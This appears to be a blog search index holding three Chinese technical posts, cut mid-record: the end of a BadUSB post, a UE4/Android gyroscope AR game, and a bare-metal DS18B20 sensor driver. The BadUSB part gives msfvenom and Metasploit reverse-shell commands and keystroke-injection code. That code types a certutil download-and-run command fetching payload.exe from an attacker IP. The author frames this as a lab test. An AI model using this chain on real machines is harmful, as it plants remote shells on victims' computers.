HAL_Delay(KEY_DELAY);\n&#125;\n\nMSF反弹shell这里仅作为badusb反弹测试，不做免杀，直接生成exe（端口默认）。\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.150.132 -f exe -o payload.exe\nmsf建立监听（端口默认）。\nuse exploit&#x2F;multi&#x2F;handler \nset payload payload&#x2F;windows&#x2F;meterpreter&#x2F;reverse_tcp\nrun\n使用python3起一个HTTP服务器来下载后门文件。\npython -m http.server\n&#96;&#96;&#96;        \n外设等初始化之后执行我们的脚本。\n&#96;&#96;&#96;c\nHAL_Delay(2000);&#x2F;&#x2F;延时两秒\nkey_press(KEY_WIN);&#x2F;&#x2F;按下win键\nkey_print(&quot;r&quot;);&#x2F;&#x2F;按下R键\nHAL_Delay(20);&#x2F;&#x2F;延时20毫秒\nkey_print(&quot;cmd &#x2F;c cd c:&#x2F;users&#x2F;admin&amp;certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.150.132:8000&#x2F;payload.exe&amp;payload.exe&quot;);&#x2F;&#x2F;输入字符串\npressFunction(KEY_ENTER);&#x2F;&#x2F;按下回车\nHAL_Delay(1000);&#x2F;&#x2F;延时一秒\nkey_press(KEY_ALT);&#x2F;&#x2F;按下alt键\npressFunction(KEY_F4);&#x2F;&#x2F;按下F4\nkey_unpress_all();&#x2F;&#x2F;避免给正常键盘造成影响，弹起所有按键\n\n\n    \n","slug":"bad_usb","date":"2022-05-24T07:59:24.000Z","categories_index":"安全,硬件","tags_index":"硬件,BadUSB","author_index":"Pa2sw0rd"},{"id":"c498b6832af326070e6d7a91fc3088af","title":"UE4使用陀螺仪实现第一人称AR射击游戏","content":"前言在我们的印象里，如果想体验AR游戏，那么就得有一定的硬件支持，其实简单来说，一个AR游戏就是利用电脑模拟产生一个三维空间的虚拟世界，通过相应的硬件传感器将人的行为输入到传统的游戏模式中，再将结果通过视觉或其它的方式反馈给我们，那么我们就用UE4引擎来实现一个简单的例子，起初是想使用硬件陀螺仪来实现这么一个例子，但是想了又想，搞硬件还得动手（其实懒得动），数据处理都在底层，先不说效果怎么样，肯定会遇到一些未知的问题，何况现在手机都有陀螺仪，so~~~~通过手机陀螺仪来实现这样一个例子，等摸清UE4了，再搞个其它有意思的东西玩玩。图片\n知识点\nUE4第一人称射击例子制作\nUE4蓝图调用自写C++类\n安卓陀螺仪的使用\nsocket通信\n\n系统分析通过获取手机陀螺仪的数据，将数据发送到游戏引擎中，游戏引擎通过陀螺仪数据做出相应的变换，那么在这个过程中我们要明确数据怎么搞到引擎中，这里使用手机APP采集陀螺仪数据，通过TCP&#x2F;IP发送到引擎中，但是引擎蓝图是不提供TCP接口的，有插件，但是使用别人的插件你还得理解他人的逻辑，还不如自己搞一个呢，所以这里就使用C++与蓝图结合的方式来实现这个东西。\n实现步骤话不多说，要实现这样一个小项目，基本的场景得要搭建起来，最起码得搞个物体用陀螺仪来实现他的旋转吧。。。这里就不敷衍了，我们简单搭建一个第一人称的模板，通过陀螺仪实现视角的移动。（这里说明一下，场景所有资源来自虚幻商城。）\n创建一个简单的第一人称射击例子关卡就不说了，简单搭一下或使用默认的就行，这里先创建actor，在创建actor之前先搞个人物动画。创建一个动画蓝图并选择白嫖的骨骼资源\n\n\n这里动画蓝图比较简单，使用人物原地不动的一个动画，然后通过“变换（修改）骨骼”将上下的视角旋转信息给到腰部的骨骼以实现一个较为真实的第一人称视角感\n\n\n现在创建actor，单击右键创建角色\n\n选择角色模型（直接拖进来也阔以），并应用之前的动画蓝图，创建一个相机及一个箭头组件（用来发射子弹），这里的控制蓝图就不仔细展示了，都是第一人称通用的东西，太乱了，我自己都不想看了\n\n将相机绑定到一个骨骼插槽（至于怎么创建….），适当调整相机坐标以获得一个较好的第一人称视角\n\n至此，一个第一人称例子算是完成了，将actor拖到关卡中，看下效果还行\n\n使用C++创建socket服务端创建一个C++类，父类继承actor组件（UActorComponent），但是只能作为actor的组件使用，这里说明一下，作为UE4的新手，起初查资料可以继承其它类，在蓝图实例化的时候总会false，无奈之下继承了actor组件。\n通过这几步实现一个socket服务器：初始化-绑定地址及端口-监听-数据接收，这里要明确一点，在我测试当中发现，actor是作为主线程运行的，其中监听及数据接收阶段会阻塞线程，会直接卡死，所以在这里我们需要创建线程去执行上述两步。但是作为线程的话我们需要共享一些对象及数据，因不知道UE4的全局变量，这里就用指针传递数据；\n创建一个初始化线程类（初始化也写到这里了）\nclass MYDEMO_API acceptSocket :public FRunnable &#123; \npublic: \n    acceptSocket(FSocket* client, FSocket* server, FString ipAddr, INT32 port, float* x, float* y, float* z,bool* isAttack) : m_Client(client) ,m_Server(server),m_ipAddr(ipAddr),m_port(port),  m_x(x), m_y(y), m_z(z),m_isAttack(isAttack) \n    &#123;&#125; \n    ~acceptSocket() \n    &#123; \n        stopping &#x3D; true; \n    &#125; \n \n    virtual bool Init() override \n&#123; \n        stopping &#x3D; false; \n        return true; \n    &#125; \n \n    virtual uint32 Run() override \n&#123; \n \n        m_Server &#x3D; ISocketSubsystem::Get(PLATFORM_SOCKETSUBSYSTEM)-&gt;CreateSocket(NAME_Stream, TEXT(&quot;default&quot;), false); \n \n        if (!m_Server) &#123; \n            GEngine-&gt;AddOnScreenDebugMessage \n            ( \n                -1, \n                10,                                  &#x2F;&#x2F;           显示的时间&#x2F;秒 \n                FColor::Blue,            &#x2F;&#x2F;           显示的颜色 \n                &quot;初始化server失败！&quot;           &#x2F;&#x2F;           显示的信息 \n            ); \n            return false; \n        &#125; \n        FIPv4Address ip; \n        FIPv4Address::Parse(m_ipAddr, ip); \n        TSharedRef&lt;FInternetAddr&gt; addr &#x3D; ISocketSubsystem::Get(PLATFORM_SOCKETSUBSYSTEM)-&gt;CreateInternetAddr(); \n        addr-&gt;SetIp(ip.Value); \n        addr-&gt;SetPort(m_port); \n        bool bBind &#x3D; m_Server-&gt;Bind(*addr); \n        if (!bBind) &#123; \n            return false; \n        &#125; \n        bool bListen &#x3D; m_Server-&gt;Listen(1); \n        if (!bListen) return false; \n        TSharedRef&lt;FInternetAddr&gt; targetAddr &#x3D; ISocketSubsystem::Get(PLATFORM_SOCKETSUBSYSTEM)-&gt;CreateInternetAddr(); \n        FIPv4Address::Parse(m_ipAddr, ip); \n        targetAddr-&gt;SetIp(ip.Value); \n        targetAddr-&gt;SetPort(m_port); \n        while (!stopping) \n        &#123; \n            m_Client &#x3D; m_Server-&gt;Accept(*targetAddr, &quot;aaa&quot;); \n            if (!m_Client) \n                continue; \n            INT32 temp; \n            FString data &#x3D; &quot;hello&quot;; \n            FRunnableThread::Create(new recvSocket(m_Client,m_x,m_y,m_z,m_isAttack),TEXT(&quot;RecvThread&quot;)); \n            if (m_Client-&gt;Send((uint8*)TCHAR_TO_ANSI(data.GetCharArray().GetData()), 5, temp)) &#123; \n                &#x2F;&#x2F;GEngine-&gt;AddOnScreenDebugMessage(1, 2.0f, FColor::Green, TEXT(&quot;发送成功!&quot;)); \n            &#125; \n        &#125; \n         \n \n \n        return 1; \n    &#125; \n \n    virtual void Stop() override \n&#123; \n        stopping &#x3D; true;    &#x2F;&#x2F;计数器-1 \n    &#125; \n \nprivate: \n    FSocket* m_Client,*m_Server;  &#x2F;&#x2F;客户端套接字 \n    FString m_ipAddr; \n    INT32 m_port; \n    bool* m_isAttack; \n    float* m_x, * m_y, * m_z; \n    bool stopping;      &#x2F;&#x2F;循环控制 \n    FThreadSafeCounter m_StopTaskCounter;   &#x2F;&#x2F;线程引用计数器 \n&#125;;\n数据接收线程，只是一个例子，就不校验数据准确性了，因为非硬件开发，就不考虑内存大小了，直接传字符串，发送前和接收后再转就行了。这里避免粘包，简单封装了一下数据帧，帧头帧尾为0x73(s)&#x2F;0x6f(o)，用逗号分割两个轴的旋转量，冒号分割是否开火状态。具体可以看代码。\n\nclass MYDEMO_API recvSocket :public FRunnable &#123; \npublic: \n    recvSocket(FSocket* client, float* x, float* y, float* z,bool* isAttack) : m_Client(client),m_x(x),m_y(y),m_z(z),m_isAttack(isAttack) \n    &#123;&#125; \n    ~recvSocket() \n    &#123; \n        stopping &#x3D; true; \n    &#125; \n \n    virtual bool Init() override \n&#123; \n        stopping &#x3D; false; \n        return true; \n    &#125; \n    FString StringFromBinaryArray(const TArray&lt;uint8&gt;&amp; BinaryArray) \n&#123; \n        return FString(ANSI_TO_TCHAR(reinterpret_cast&lt;const char*&gt;(BinaryArray.GetData()))); \n    &#125; \n \n    virtual uint32 Run() override \n&#123; \n        if (!m_Client) &#123; \n            return 1; \n        &#125; \n        TArray&lt;uint8&gt; recvBuffer; \n        uint32 size &#x3D; 1; \n        while (!stopping) \n        &#123; \n            try &#123; \n                if (m_Client-&gt;GetConnectionState() &#x3D;&#x3D; SCS_Connected) &#123; \n                    if (m_Client-&gt;HasPendingData(size)) &#123; \n                        recvBuffer.Init(0, 1024U); \n                        &#x2F;&#x2F;GEngine-&gt;AddOnScreenDebugMessage(1, 2.0f, FColor::Green, TEXT(&quot;client is read to recv!!%d&quot;)); \n                        int32 element &#x3D; 0; \n                        m_Client-&gt;Recv(recvBuffer.GetData(), recvBuffer.Num(), element); \n                        &#x2F;&#x2F;GEngine-&gt;AddOnScreenDebugMessage(1, 2.0f, FColor::Green, TEXT()); \n                         \n                        &#x2F;&#x2F;UE_LOG(LogTemp, Warning, TEXT(&quot;*** %c&quot;), recvBuffer.GetData()[0]); \n                         \n                        &#x2F;&#x2F;*m_x &#x3D; FCString::Atof(*StringFromBinaryArray(recvBuffer)); \n                        FString x &#x3D; &quot;&quot;; \n                        FString y &#x3D; &quot;&quot;; \n                        bool splitFlag &#x3D; false; \n                        bool frameFlag &#x3D; false; \n                        &#x2F;&#x2F;bool splitAttack &#x3D; false; \n                        &#x2F;* \n                        数据帧解析 \n                        *&#x2F; \n                        for (int i &#x3D; 0; i &lt; recvBuffer.Num(); i++) &#123; \n                            unsigned char temp &#x3D;recvBuffer.GetData()[i]; \n                            &#x2F;&#x2F;GEngine-&gt;AddOnScreenDebugMessage(1, 2.0f, FColor::Green, FString::Printf(TEXT(&quot;%c\\n&quot;), temp)); \n                            if (temp &#x3D;&#x3D; &#39;o&#39;) &#123; \n                                frameFlag &#x3D; false; \n                                continue; \n                            &#125; \n \n                            if (frameFlag &amp;&amp; temp &#x3D;&#x3D; &#39;:&#39;) &#123; \n                                if (recvBuffer.GetData()[i+1] &#x3D;&#x3D; &#39;1&#39;) &#123; \n                                    *m_isAttack &#x3D; true; \n                                    continue; \n                                &#125; \n                                *m_isAttack &#x3D; false; \n                                continue; \n                            &#125; \n                            if (frameFlag &amp;&amp; temp &#x3D;&#x3D; &#39;,&#39;) &#123; \n                                splitFlag &#x3D; true; \n                                continue; \n                            &#125; \n                            if (frameFlag &amp;&amp; !splitFlag) &#123; \n                                x.AppendChar(recvBuffer.GetData()[i]); \n                                *m_x &#x3D; FCString::Atof(*x); \n                                continue; \n                                 \n                            &#125;if (frameFlag &amp;&amp; splitFlag) &#123; \n                                y.AppendChar(recvBuffer.GetData()[i]); \n                                *m_y &#x3D; FCString::Atof(*y); \n                                continue; \n                            &#125; \n                            if (temp &#x3D;&#x3D; &#39;s&#39;) &#123; \n                                frameFlag &#x3D; true; \n                                continue; \n                            &#125; \n                             \n                        &#125;    \n                        UE_LOG(LogTemp, Warning, TEXT(&quot;x: %s;&quot;), *x); \n                        UE_LOG(LogTemp, Warning, TEXT(&quot;y: %s;&quot;), *y); \n                        &#x2F;&#x2F;GEngine-&gt;AddOnScreenDebugMessage(1, 2.0f, FColor::Green, TEXT(&quot;client is recved!!&quot;)); \n                    &#125;         \n                &#125; \n                else &#123; \n                    return 1; \n                &#125; \n                 \n            &#125; \n            catch (...) &#123; \n                UE_LOG(LogTemp, Warning, TEXT(&quot;有异常！&quot;)); \n                return 1; \n            &#125; \n        &#125; \n        return 1; \n    &#125; \n    virtual void Stop() override \n&#123; \n        stopping &#x3D; true;    &#x2F;&#x2F;计数器-1 \n    &#125; \nprivate: \n    FSocket* m_Client;  &#x2F;&#x2F;客户端套接字 \n    float* m_x, * m_y, * m_z; \n    bool* m_isAttack; \n    bool stopping;      &#x2F;&#x2F;循环控制 \n    FThreadSafeCounter m_StopTaskCounter;   &#x2F;&#x2F;线程引用计数器 \n&#125;\n最后在我们的主类中定义相关方法及变量就OK了，这里用指针转递数据，指针可不能乱指，别忘了初始化指针\nUCLASS(ClassGroup &#x3D; &quot;Networking&quot;, meta &#x3D; (BlueprintSpawnableComponent)) \nclass MYDEMO_API UMySocketDemo : public UActorComponent \n&#123; \n           GENERATED_BODY() \n \npublic: \n           FSocket* server &#x3D; NULL; \n           FSocket* client&#x3D;NULL; \n    float *x&#x3D;NULL; \n    float *y &#x3D; NULL; \n    float *z &#x3D; NULL; \n    bool *isAttack &#x3D; NULL; \n           UFUNCTION(BlueprintCallable, Category &#x3D; &quot;mySocket&quot;) \n                      bool init(const FString ipAddr, const int port); \n           UFUNCTION(BlueprintCallable,Category&#x3D;&quot;mySocket&quot;) \n                      bool initSocket(const FString ipAddr,const int port); \n \n           UFUNCTION(BlueprintCallable, Category &#x3D; &quot;mySocket&quot;) \n                      bool closeSocket(); \n \n           UFUNCTION(BlueprintCallable, Category &#x3D; &quot;mySocket&quot;) \n                      void myTest(); \n    UFUNCTION(BlueprintCallable, Category &#x3D; &quot;mySocket&quot;) \n        float getXData(); \n    UFUNCTION(BlueprintCallable, Category &#x3D; &quot;mySocket&quot;) \n        float getYData(); \n    UFUNCTION(BlueprintCallable, Category &#x3D; &quot;mySocket&quot;) \n        bool getAttack(); \n            \n&#125;;\nbool UMySocketDemo::init(FString ipAddr, int port) &#123; \n    x &#x3D; (float*)malloc(sizeof(float)); \n    y &#x3D; (float*)malloc(sizeof(float)); \n    z &#x3D; (float*)malloc(sizeof(float)); \n    isAttack &#x3D; (bool*)malloc(sizeof(bool)); \n    GEngine-&gt;AddOnScreenDebugMessage(1, 2.0f, FColor::Green, TEXT(&quot;accept run!&quot;)); \n    FRunnableThread::Create(new acceptSocket(client,server,ipAddr,port,x,y,z,isAttack),TEXT(&quot;监听线程！&quot;)); \n    return true; \n&#125;\n安卓端实现安卓无非就两个功能，采集陀螺仪数据，连接服务端并发送数据，要使用socket首先添加网络权限\n&lt;uses-permission android:name&#x3D;&quot;android.permission.INTERNET&quot;&#x2F;&gt;\n创建一个socket类，用来连接及发送数据，连接地址及端口写死了，用的时候按需修改就行\npackage com.pa2sw0rd.myar; \n \nimport android.util.Log; \n \nimport java.io.BufferedWriter; \nimport java.io.IOException; \nimport java.io.OutputStream; \nimport java.io.OutputStreamWriter; \nimport java.net.Socket; \nimport java.net.SocketAddress; \nimport java.nio.charset.StandardCharsets; \n \npublic class MySocket &#123; \n    Socket socket&#x3D;null; \n    &#x2F;&#x2F;static SocketAddress socketAddress&#x3D;[&quot;127.0.0.1&quot;,998]; \n    public MySocket()&#123; \n        try &#123; \n            this.socket&#x3D;new Socket(&quot;192.168.1.104&quot;,998); \n        &#125; catch (IOException e) &#123; \n            e.printStackTrace(); \n        &#125; \n    &#125; \n    public void send(String data) &#123; \n        try&#123; \n            BufferedWriter bufferedWriter&#x3D;null; \n            try &#123; \n                bufferedWriter &#x3D; new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())); \n            &#125; catch (IOException e) &#123; \n                Log.d(&quot;Client&quot;,&quot;BufferedWriter出错&quot;); \n                e.printStackTrace(); \n            &#125; \n            try &#123; \n                &#x2F;&#x2F; 发送数据 \n                bufferedWriter.write(data); \n                bufferedWriter.flush(); \n                &#x2F;&#x2F;bufferedWriter.close(); \n            &#125; catch (IOException e) &#123; \n                Log.d(&quot;Client&quot;,&quot;发送数据出错&quot;); \n                e.printStackTrace(); \n            &#125; \n        &#125;catch (Exception e)&#123; \n            &#x2F;&#x2F;e.printStackTrace(); \n        &#125; \n \n    &#125; \n&#125;\n在oncreate中初始化相关view、传感器及socket\n private void init()&#123; \n    this.textView&#x3D;findViewById(R.id.TextView); \n    this.sensorManager&#x3D;(SensorManager) getSystemService(Context.SENSOR_SERVICE); \n    this.mySocket&#x3D;new MySocket(); \n&#125;\n重写两个方法，在退出APP和回到APP时重写卸载&#x2F;注册传感器,这里使用快速采样SENSOR_DELAY_FASTEST，效果好一点\n@Override \nprotected void onPause() &#123; \n    super.onPause(); \n    if(this.sensorManager!&#x3D;null)&#123; \n        this.sensorManager.unregisterListener(this); \n    &#125; \n\n&#125; \n@Override \nprotected void onResume() &#123; \n    super.onResume(); \n    this.sensorManager.registerListener(this, \n            sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE), \n            SensorManager.SENSOR_DELAY_FASTEST); \n\n&#125;\n最获取陀螺仪数据，简单封装一下发送到服务端，至此，我们的一个陀螺仪ar例子就完成了\n\n@Override \npublic void onSensorChanged(SensorEvent event) &#123; \n    if (event.sensor.getType() &#x3D;&#x3D; Sensor.TYPE_GYROSCOPE) &#123; &#x2F;&#x2F; 陀螺仪角度变更事件 \n        if (mTimestamp !&#x3D; 0) &#123; \n            final float dT &#x3D; (event.timestamp - mTimestamp) * NS2S; \n            mAngle[0] +&#x3D; event.values[0] * dT; \n            mAngle[1] +&#x3D; event.values[1] * dT; \n            mAngle[2] +&#x3D; event.values[2] * dT; \n            float angleX &#x3D; (float) Math.toDegrees(mAngle[0]); \n            float angleY &#x3D; (float) Math.toDegrees(mAngle[1]); \n            float angleZ &#x3D; (float) Math.toDegrees(mAngle[2]); \n            String z&#x3D;String.format(&quot;%f&quot;,angleZ); \n            String sendData&#x3D;&quot;s&quot;+z+&quot;,&quot;+String.format(&quot;%f&quot;,angleX)+&quot;:&quot;+(this.isParsed?&quot;1&quot;:&quot;0&quot;)+&quot;o&quot;; \n            &#x2F;&#x2F;this.sensorManager.getOrientation(r,values); \n            &#x2F;&#x2F;String desc &#x3D; String.format(&quot;陀螺仪检测到当前\\nx轴方向的转动角度为%f\\ny轴方向的转动角度为%f\\nz轴方向的转动角度为%f&quot;, r[0], values[1], values[2]); \n            this.mySocket.send(sendData); \n            this.textView.setText(sendData); \n        &#125; \n        mTimestamp &#x3D; event.timestamp; \n    &#125; \n&#125;\n最终效果因为没有对陀螺仪的数据进行滤波，画面看起来有点抖动\n\n    \n","slug":"ue4-gyro","date":"2022-05-23T15:36:33.000Z","categories_index":"开发,ue4,ue4,c++","tags_index":"虚幻4引擎,陀螺仪,Java,C++","author_index":"Pa2sw0rd"},{"id":"541b240588262648fd83a34d7c89d5e4","title":"ARM Contex-A8裸机DS18B20驱动","content":"近期做一个裸机采集温度的设计，要求裸机实现，网上DS18B20的驱动资料很多，但是基本都是51和STM32以及通过跑操作系统驱动实现的，这方面的资料少之又少。经过两天时间的学习，实现了基于三星的S5PV210 CPU裸机读取DS18B20温度。DS18B20的时序就不说了，网上资料很多，其实重点在于IO配置以及精准延时。前期通过定时器实现延时，但是发现误差很大，实现不了，后来通过查看朱有鹏老师的课程，搬用了汇编的延时程序，达到了微妙级的延时，最准实现了裸机读取温度值。\n原理图博客迁移，图片丢失～\n启动代码（初始化时钟、串口等）.text\n.global _start\n.global IRQ_handle\n_start:\n\t\tldr sp,&#x3D;0xD0037D80\t&#x2F;&#x2F;初始化栈\n \n\t\tbl  EnableIRQ\t\t&#x2F;&#x2F;打开全局IRQ中断开关\n \n\t\tbl  EnableVIC\t\t&#x2F;&#x2F;使能中断控制器\n \n\t\tbl \tclock_init\t\t&#x2F;&#x2F;初始化系统时钟\n \n\t\tbl \tuart_init\t\t&#x2F;&#x2F;初始化串口\n \n\t\tbl  main\t\t\t&#x2F;&#x2F;跳转到main函数执行，它是用C函数实现的\nhalt:\n\t\tb halt\n \n \nEnableIRQ:\n        mrs r0,cpsr  \t\t \t\t&#x2F;&#x2F;获得cpsr寄存器的值，放入r0当中\n \n        bic r0,r0,#(1&lt;&lt;7)  \t\t\t&#x2F;&#x2F;将r0的第7位清零\n \n        msr cpsr_cxsf,r0   \t\t\t&#x2F;&#x2F;将清零后的值重新放回cpsr当中\n \n        mov pc,lr        \t\t\t&#x2F;&#x2F;lr位r14，即调用函数语句的下一条语\nEnableVIC:\n\t    mrc  p15,0,r0,c1,c0,0\n \n\t    orr  r0,r0,#(1&lt;&lt;24)\n \n\t    mcr  p15,0,r0,c1,c0,0\n \n\t    mov  pc,lr\nDS18B20.h（定义相关寄存器）#define DS18B20CON (*(volatile unsigned int *)0xE02002A0)\n#define DS18B20DAT (*(volatile unsigned int *)0xE02002A4)\n#define DS18B20PUD (*(volatile unsigned int *)0xE02002A8)\n \n \n#define DS18B20_DQ_OUT_L DS18B20DAT&#x3D;0x00\n#define DS18B20_DQ_OUT_H DS18B20DAT&#x3D;0xff\n#define DS18B20_DQ_IN (DS18B20DAT&amp;0b10000000)\nvoid Delay_ms(unsigned int num);\nvoid Delay_us(long us);\nvoid set_out();\nvoid set_in();\nunsigned char read(void);\nvoid write(unsigned char d);\nunsigned char reset();\nunsigned char readData();\nvoid writeData(unsigned char d);\nunsigned short readTemp();\nDS18B20.C（驱动实现） \n#include &quot;ds18b20.h&quot;\nvoid Delay_ms(unsigned int num)&#123;\n\tunsigned int temp1&#x3D;58823;\n\tunsigned int temp2&#x3D;0;\n\tasm volatile(\n\t\t\t&quot;Delay_ms_0:\\n&quot;\n\t\t\t&quot;mov %0,%2\\n&quot;\n\t\t\t&quot;Delay_ms_1:\\n&quot;\n\t\t\t&quot;subs %0,%0,#1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t&quot;mov %0,%0\\n&quot;\n\t\t\t&quot;bne Delay_ms_1\\n&quot;\n\t\t\t&quot;subs %1,%1,#1\\n&quot;\n\t\t\t&quot;bne Delay_ms_0\\n&quot;\n\t\t\t:&quot;+r&quot;(temp2),&quot;+r&quot;(num):&quot;r&quot;(temp1):&quot;cc&quot;\n\t);\n \n&#125;\nvoid set_out()&#123;\n\tDS18B20CON&amp;&#x3D;~(0xf&lt;&lt;(4*2));\n\tDS18B20CON|&#x3D;0x1&lt;&lt;(4*2);\n&#125;\nvoid set_in()&#123;\n\tDS18B20CON&#x3D;~(0xf&lt;&lt;(4*2));\n&#125;\nunsigned char read(void)&#123;\n\tunsigned char value;\n\tvalue&#x3D;DS18B20DAT;\n\tvalue&gt;&gt;&#x3D;(1*2);\n\tvalue&amp;&#x3D;0x1;\n\treturn value;\n&#125;\nvoid write(unsigned char d)&#123;\n\tif(d&#x3D;&#x3D;1) DS18B20DAT|&#x3D;0x1&lt;&lt;(1*2);\n\telse DS18B20DAT&amp;&#x3D;~(0x1&lt;&lt;(1*2));\n&#125;\nunsigned char reset()&#123;\n\tunsigned short i&#x3D;0;\n\tset_out();\n\twrite(0);\n\tDelay_us(680);\n\tset_in();\n\twhile(read())&#123;\n\t\ti++;\n\t\tDelay_us(1);\n\t\tif(i&gt;100) return 1;\n\t&#125;\n\tDelay_us(270);\n\treturn 0;\n&#125;\nunsigned char readData()&#123;\n\tunsigned char i,d&#x3D;0;\n\tfor(i&#x3D;0;i&lt;8;i++)&#123;\n\t\tset_out();\n\t\twrite(0);\n\t\td&gt;&gt;&#x3D;1;\n\t\tDelay_us(1);\n\t\tset_in();\n\t\tif(read()) d|&#x3D;0x80;\n\t\tDelay_us(40);\n\t&#125;\n\treturn d;\n&#125;\nvoid writeData(unsigned char d)&#123;\n\tunsigned char i;\n\tfor(i&#x3D;0;i&lt;8;i++)&#123;\n\t\tset_out();\n\t\twrite(0);\n\t\tDelay_us(3);\n\t\twrite(d&amp;0x01);\n\t\tDelay_us(60);\n\t\tset_in();\n\t\td&gt;&gt;&#x3D;1;\n\t&#125;\n&#125;\nunsigned short readTemp()&#123;\n\tunsigned char th,tl;\n\tunsigned short d;\n\tif(reset())&#123;\n\t\treturn 88;&#x2F;&#x2F;错误\n\t&#125;\n\twriteData(0xcc);\n\twriteData(0x44);\n\tif(reset())&#123;\n\t\treturn 88;&#x2F;&#x2F;错误\n\t&#125;\n\twriteData(0xcc);\n\twriteData(0xbe);\n\ttl&#x3D;readData();\n\tth&#x3D;readData();\n\treturn tl&#x2F;16+th*16;\n\t&#x2F;&#x2F;printf(&quot;temph:%d;templ:%d;\\n&quot;,readData(),readData());\n&#125;\nvoid Delay_us(long us)&#123;\n\tunsigned int temp1&#x3D;59;\n\t\tunsigned int temp2&#x3D;0;\n\t\tasm volatile(\n\t\t\t\t&quot;Delay_us_0:\\n&quot;\n\t\t\t\t&quot;mov %0,%2\\n&quot;\n\t\t\t\t&quot;Delay_us_1:\\n&quot;\n\t\t\t\t&quot;subs %0,%0,#1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %1,%1\\n&quot;\n\t\t\t\t&quot;mov %0,%0\\n&quot;\n\t\t\t\t&quot;bne Delay_us_1\\n&quot;\n\t\t\t\t&quot;subs %1,%1,#1\\n&quot;\n\t\t\t\t&quot;bne Delay_us_0\\n&quot;\n\t\t\t\t:&quot;+r&quot;(temp2),&quot;+r&quot;(us):&quot;r&quot;(temp1):&quot;cc&quot;\n\t\t);\n&#125;\nmain.c&#x2F;*按键相关的寄存器地址*&#x2F;\n#define GPJ0CON\t\t (*(volatile unsigned int *)0xE0200240)\n#define GPJ0DAT\t \t (*(volatile unsigned int *)0xE0200244)\n#define GPJ0PUD\t\t (*(volatile unsigned int *)0xE0200248)\n#define GPJ1CON      (*(volatile unsigned int *)0xE0200260)\n#define GPJ1DAT      (*(volatile unsigned int *)0xE0200264)\n#define GPJ1PUD      (*(volatile unsigned int *)0xE0200268)\n#define GPJ4CON      (*(volatile unsigned int *)0xE02002C0)\n#define GPJ4DAT      (*(volatile unsigned int *)0xE02002C4)\n&#x2F;*LED1相关的寄存器地址*&#x2F;\n#define GPJ2CON      (*(volatile unsigned int *)0xE0200280)\n#define GPJ2DAT      (*(volatile unsigned int *)0xE0200284)\n \n&#x2F;&#x2F;蜂鸣器\n#define GPD0CON      (*(volatile unsigned int *)0xE02000A0)\n#define GPD0DAT      (*(volatile unsigned int *)0xE02000A4)\n \n \n#include &quot;timer.h&quot;\n#include &quot;ds18b20.h&quot;\nvoid key_init()\n&#123;\n\t&#x2F;*\n\t&#x2F;&#x2F;设置CPJ1_2设置为输入模式\n\tGPJ1CON &#x3D; GPJ1CON &amp; 0xfffff0ff;  &#x2F;&#x2F;清除[12-15],设置为0，即设置为输入模式\n\tGPJ1PUD &#x3D; GPJ1PUD &amp; 0xffcf;\t\t &#x2F;&#x2F;清除[6-7]\n\tGPJ1PUD &#x3D; GPJ1PUD | 0x10;\t\t&#x2F;&#x2F;设置[6-7]为01，即下拉使能\n \n\t&#x2F;&#x2F;设置CPJ4_3设置为输出模式\n\tGPJ4CON &#x3D; GPJ4CON &amp; 0xffff0fff;  &#x2F;&#x2F;清除[16-19],设置为0\n\tGPJ4CON &#x3D; GPJ4CON | 0x1000;\t &#x2F;&#x2F;设置[16-19]四位为0001，即设置为输出模式\n\tGPJ4DAT &#x3D; GPJ4DAT | 0x8\t;\t &#x2F;&#x2F;设置GPJ4_4输出高电平\n\t*&#x2F;\n\t&#x2F;&#x2F;设置CPJ1_0设置为输入模式\n\t&#x2F;&#x2F;GPJ1CON &#x3D; GPJ1CON &amp; 0xffff0000;  &#x2F;&#x2F;清除[12-15],设置为0，即设置为输入模式\n\tGPJ1CON&#x3D;0x00;\n\t&#x2F;&#x2F;GPJ1PUD &#x3D; GPJ1PUD &amp; 0x5555;\t\t &#x2F;&#x2F;清除[6-7]\n\t&#x2F;&#x2F;GPJ1PUD &#x3D; GPJ1PUD | 0x1;\t\t&#x2F;&#x2F;设置[6-7]为01，即下拉使能\n\tGPJ1PUD &#x3D; 0x5555;\n\t&#x2F;&#x2F;设置CPJ4_4设置为输出模式\n\tGPJ4CON &#x3D; GPJ4CON &amp; 0xfff0000f;  &#x2F;&#x2F;清除[16-19],设置为0\n\tGPJ4CON &#x3D; GPJ4CON | 0x11110;\t &#x2F;&#x2F;设置[16-19]四位为0001，即设置为输出模式\n\t&#x2F;&#x2F;GPJ4DAT &#x3D; GPJ4DAT | 0x10;\t 